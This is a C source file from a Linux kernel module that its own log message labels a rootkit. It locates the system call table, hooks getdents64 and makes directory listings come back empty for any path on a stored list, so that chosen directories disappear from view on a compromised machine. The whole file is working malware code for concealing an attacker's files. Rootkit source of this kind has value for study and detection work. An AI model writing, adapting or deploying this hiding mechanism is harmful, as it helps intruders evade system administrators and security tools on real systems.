#define _GNU_SOURCE
#include "hidden.h"
#include "helper.h"


/* 存放所有被隐藏的目录 */
LIST_HEAD(system_dir_hooked_list);
struct dir_hooked{
    char name[DIR_PATH_NR];
    struct list_head dir_hooked_list;
};


static void getdents64_before_hooker(struct pt_regs *regs){
}


static void getdents64_after_hooker(struct pt_regs *regs, size_t *ret){
    struct dir_hooked *pos, *tmp;
    unsigned long copy_nr;
    char dir_name[DIR_PATH_NR] = {0};
    copy_nr = copy_from_user((void *)dir_name, *(void **)(regs->di), DIR_PATH_NR);

    list_for_each_entry_safe(pos, tmp, &system_dir_hooked_list, dir_hooked_list) {
        if(strstr(dir_name, pos->name)){
            *ret = 0;
            return;
        }
    }
}

ssize_t dir_hidden(char *dirname){
    struct hook_context *getdents_hook_ctx = hook_ctx_init();
    struct dir_hooked *dir_hooked_ptr = (struct dir_hooked *)kmalloc(sizeof(struct dir_hooked), GFP_KERNEL);
    memcpy(dir_hooked_ptr->name, dirname, DIR_PATH_NR);
    list_add_tail(&dir_hooked_ptr->dir_hooked_list, &system_dir_hooked_list);
    sys_call_table_finder();
    if(!getdents_hook_ctx){
        printk(KERN_INFO "[peiwithhao rootkit] hook_ctx alloc failed...");
        return 1;
    }
    hookpoint_add(getdents_hook_ctx, (size_t)((size_t *)syscall_table_addr)[217], (size_t)&getdents64_before_hooker, (size_t)&getdents64_after_hooker);
    return 0;

}


